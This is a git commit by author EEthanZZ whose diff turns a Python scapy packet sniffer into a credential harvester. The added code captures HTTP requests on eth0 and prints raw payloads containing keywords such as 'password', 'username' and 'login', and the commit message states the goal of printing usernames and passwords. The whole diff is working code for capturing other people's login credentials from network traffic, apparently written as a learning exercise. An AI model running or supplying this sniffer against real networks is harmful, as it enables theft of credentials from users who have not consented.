c0eaf6f09b81775fc4baebd8f5ce6e95b6a41f59
EEthanZZ <zycc2727@gmail.com>
2023-09-18 05:52:16 -0400

    print the usernames and passwords only break when the first keyword is detected

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -1,15 +1,24 @@
 import scapy.all as scapy
+from scapy.layers import http
 
 
 def sniff(interface):
     # prn -> callback function
     # store -> store in Memory
     # prn -> each packet is processed by the other function
+    # filter -> protocols/ prot no.
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 
 def process_sniffed_packet(packet):
-    print(packet)
+    if packet.haslayer(http.HTTPRequest):
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keywords = ["pass", "password", "uname", "username", "login"]
+            for i in keywords:
+                if i in str(load):
+                    print(load)
+                    break
 
 
 sniff("eth0")
